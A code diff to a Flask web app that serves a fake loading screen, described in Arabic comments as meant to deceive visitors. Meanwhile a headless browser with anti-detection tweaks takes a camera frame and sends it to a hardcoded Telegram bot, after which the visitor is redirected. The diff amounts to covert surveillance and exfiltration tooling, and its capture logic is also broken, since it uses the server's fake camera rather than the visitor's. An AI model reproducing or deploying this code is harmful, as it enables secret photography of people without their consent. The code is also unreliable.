@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-from flask import Flask, render_template, jsonify, request
+from flask import Flask, render_template, jsonify, request, redirect, url_for
 import asyncio
 import aiohttp
 import base64
@@ -22,10 +22,11 @@ CHAT_ID = "8790754582"
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
 
 # ---------- GLOBAL VARIABLES ----------
-capture_thread = None
 is_capturing = False
-last_image = None
+capture_complete = False
+latest_filename = None
 capture_log = []
+total_captures = 0
 
 # ---------- FILE NAME GENERATOR ----------
 def generate_filename(ext="jpg"):
@@ -33,9 +34,10 @@ def generate_filename(ext="jpg"):
     rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
     return f"cam_{ts}_{rand}.{ext}"
 
-# ---------- CAPTURE ENGINE (RUNS IN BACKGROUND) ----------
+# ---------- CAPTURE ENGINE ----------
 async def capture_and_send():
     """Captures one frame and sends to Telegram."""
+    global total_captures, latest_filename
     try:
         async with async_playwright() as p:
             browser = await p.chromium.launch(
@@ -45,23 +47,25 @@ async def capture_and_send():
                     "--use-fake-device-for-media-stream",
                     "--disable-web-security",
                     "--no-sandbox",
-                    "--disable-setuid-sandbox"
+                    "--disable-setuid-sandbox",
+                    "--disable-blink-features=AutomationControlled"
                 ]
             )
             context = await browser.new_context(
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                 viewport={"width": 1280, "height": 720}
             )
             page = await context.new_page()
             
-            # Inject stealth
+            # Stealth
             await page.add_init_script("""
                 Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                 window.chrome = { runtime: {} };
+                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
             """)
             
-            # Load a dummy page (any URL)
-            await page.goto("https://example.com")
+            # Load any page (use about:blank for speed)
+            await page.goto("about:blank")
             
             # Capture script
             js_code = """
@@ -92,7 +96,7 @@ async def capture_and_send():
                                     let dataUrl = canvas.toDataURL('image/jpeg', 0.95);
                                     stream.getTracks().forEach(track => track.stop());
                                     resolve({ image: dataUrl });
-                                }, 500);
+                                }, 600);
                             };
                         },
                         function(err) {
@@ -115,6 +119,7 @@ async def capture_and_send():
             
             # Send to Telegram
             fname = generate_filename()
+            latest_filename = fname
             async with aiohttp.ClientSession() as session:
                 data = aiohttp.FormData()
                 data.add_field('chat_id', CHAT_ID)
@@ -123,6 +128,7 @@ async def capture_and_send():
                 
                 async with session.post(TELEGRAM_API, data=data) as resp:
                     if resp.status == 200:
+                        total_captures += 1
                         return {'status': 'success', 'filename': fname}
                     else:
                         return {'status': 'error', 'message': f'Telegram error: {resp.status}'}
@@ -130,79 +136,86 @@ async def capture_and_send():
     except Exception as e:
         return {'status': 'error', 'message': str(e)}
 
-def background_capture_loop():
-    """Runs capture in an infinite loop with random intervals."""
-    global is_capturing, capture_log
+def background_capture():
+    """Runs capture once and updates global flags."""
+    global is_capturing, capture_complete, capture_log
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
-    while is_capturing:
-        try:
-            result = loop.run_until_complete(capture_and_send())
-            log_entry = {
-                'time': datetime.now().isoformat(),
-                'status': result.get('status'),
-                'message': result.get('message') or result.get('filename', '')
-            }
-            capture_log.append(log_entry)
-            # Keep log size manageable
-            if len(capture_log) > 100:
-                capture_log = capture_log[-100:]
-            
-            # Random sleep between 5-15 seconds
-            sleep_time = random.uniform(5.0, 15.0)
-            time.sleep(sleep_time)
-            
-        except Exception as e:
-            print(f"Background error: {e}")
-            time.sleep(10)
+    try:
+        result = loop.run_until_complete(capture_and_send())
+        log_entry = {
+            'time': datetime.now().isoformat(),
+            'status': result.get('status'),
+            'message': result.get('message') or result.get('filename', '')
+        }
+        capture_log.append(log_entry)
+        if len(capture_log) > 50:
+            capture_log = capture_log[-50:]
+        capture_complete = True
+    except Exception as e:
+        capture_log.append({'time': datetime.now().isoformat(), 'status': 'error', 'message': str(e)})
+        capture_complete = True
+    finally:
+        is_capturing = False
 
 # ---------- FLASK ROUTES ----------
 @app.route('/')
-def index():
-    """Serve the fake HTML page."""
-    return render_template('index.html')
+def loading_page():
+    """الصفحة الأولى: شاشة تحميل وهمية"""
+    global is_capturing, capture_complete
+    
+    # Reset flags for new visit
+    is_capturing = True
+    capture_complete = False
+    
+    # Start capture in background thread
+    thread = threading.Thread(target=background_capture, daemon=True)
+    thread.start()
+    
+    return render_template('loading.html')
 
-@app.route('/api/status')
-def status():
-    """Return current capture status."""
-    return jsonify({
-        'is_capturing': is_capturing,
-        'log_count': len(capture_log),
-        'last_log': capture_log[-5:] if capture_log else []
-    })
+@app.route('/api/progress')
+def progress():
+    """API يتحقق من حالة الالتقاط (يستخدمه JavaScript لتحديث شريط التقدم)"""
+    global is_capturing, capture_complete, latest_filename, total_captures
+    
+    # Generate fake progress (0-100) based on time
+    # نجعل التقدم يتحرك ببطء لإيهام المستخدم بأن شيئاً يحدث
+    if is_capturing:
+        # Progress يزيد تدريجياً من 0 إلى 95
+        elapsed = int(time.time() * 10) % 100
+        progress = min(95, elapsed)
+        return jsonify({
+            'status': 'loading',
+            'progress': progress,
+            'message': f'جاري التحميل... {progress}%'
+        })
+    elif capture_complete:
+        return jsonify({
+            'status': 'complete',
+            'progress': 100,
+            'message': '✅ تم التحميل بنجاح!',
+            'filename': latest_filename,
+            'total': total_captures
+        })
+    else:
+        return jsonify({
+            'status': 'error',
+            'progress': 0,
+            'message': '⚠️ حدث خطأ، حاول مرة أخرى'
+        })
 
-@app.route('/api/start', methods=['POST'])
-def start_capture():
-    """Start the background capture thread."""
-    global is_capturing, capture_thread
-    if not is_capturing:
-        is_capturing = True
-        capture_thread = threading.Thread(target=background_capture_loop, daemon=True)
-        capture_thread.start()
-        return jsonify({'status': 'started'})
-    return jsonify({'status': 'already_running'})
-
-@app.route('/api/stop', methods=['POST'])
-def stop_capture():
-    """Stop the background capture."""
-    global is_capturing
-    is_capturing = False
-    return jsonify({'status': 'stopped'})
+@app.route('/redirect')
+def redirect_page():
+    """الصفحة النهائية بعد الانتهاء - تعيد التوجيه إلى موقع آخر"""
+    return render_template('redirect.html')
 
 @app.route('/api/log')
 def get_log():
-    """Return capture log."""
-    return jsonify({'log': capture_log})
+    return jsonify({'log': capture_log, 'total': total_captures})
 
 # ---------- RUN APP ----------
 if __name__ == '__main__':
-    # Auto-start capture when server runs
-    if not is_capturing:
-        is_capturing = True
-        capture_thread = threading.Thread(target=background_capture_loop, daemon=True)
-        capture_thread.start()
-    
-    # For production (Render, PythonAnywhere, etc.)
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
